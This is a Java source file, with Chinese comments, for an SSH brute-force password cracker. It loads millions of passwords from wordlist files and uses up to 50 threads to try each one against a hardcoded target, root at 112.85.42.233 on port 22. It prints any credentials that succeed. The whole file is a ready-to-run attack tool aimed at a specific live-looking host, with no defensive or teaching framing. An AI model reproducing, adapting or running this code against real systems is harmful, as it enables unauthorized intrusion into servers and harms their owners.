package ssh;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Vector;

public class SSHLogin {
    private Vector<String> list;
    private String username;
    private String host;
    private int port;
    private Integer counter = 0;
    private Integer failCounter = 0;


    /**
     * 连接目标主机
     *
     * @param username 用户名
     * @param host     主机
     * @param port     端口
     */
    public SSHLogin(String username, String host, int port) {
        this.username = username;
        this.host = host;
        this.port = port;

        list = new Vector<String>(500000);
        this.readPasswords();
    }

    /**
     * 建立单次连接
     *
     * @param username 用户名
     * @param host     主机
     * @param port     端口
     * @param password 密码
     */
    public void connect(String username, String host, int port, String password) {
        try {
            JSch jSch = new JSch();
            jSch.setKnownHosts("/Users/shihuazhuo/.ssh/known_hosts");
            Session session = jSch.getSession(username, host, port);
            session.setPassword(password);
            session.connect();

            System.out.println("\n连接成功：" + username + "@" + host + ":" + port + " 密码：" + password);
            session.disconnect();
            return;
        } catch (JSchException e) {
//            synchronized (failCounter){
//            System.out.print("\r");
            failCounter++;
            System.out.println("失败" + failCounter + "次");
//            }
        }
    }

    /**
     * 把密码文件拆分后添加进list
     *
     * @param inputStream
     */
    public void readPasswordFromFile(InputStream inputStream) {
        BufferedReader br = new BufferedReader(new InputStreamReader(inputStream));
        try {
            while (true) {
                String password = br.readLine();
                if (password == null) {
                    break;
                }
                list.add(password.trim());
            }

            br.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * 读取密码文件
     */
    public void readPasswords() {
        String[] passwords = new String[]{"/passwords/(1-100W).TXT", "/passwords/(101W-200W).TXT", "/passwords/(201W-300W).TXT", "/passwords/(301W-400W).TXT", "/passwords/(401W-500W).TXT"};
        for (int i = 0; i < passwords.length; i++) {
            readPasswordFromFile(SSHLogin.class.getResourceAsStream(passwords[i]));
        }
    }

    /**
     * 暴力破解
     */
    public void forceCrack() {
        /**
         * 判断是否加载了密码
         */
        if (list.isEmpty()) {
            Thread thread = new Thread(new Runnable() {
                public void run() {
                    readPasswords();
                }
            });
            thread.start();
        }
        System.out.println("开始破解");
        while (counter < list.size()) {
            if (Thread.activeCount() < 50) {
                final int c = counter++;
                Thread thread = new Thread(new Runnable() {
                    public void run() {
                        connect(username, host, port, list.get(c));
                    }
                });
                thread.start();
            }
        }
    }

    public static void main(String[] args) {
        SSHLogin sshLogin = new SSHLogin("root", "112.85.42.233", 22);
        sshLogin.forceCrack();
    }

}
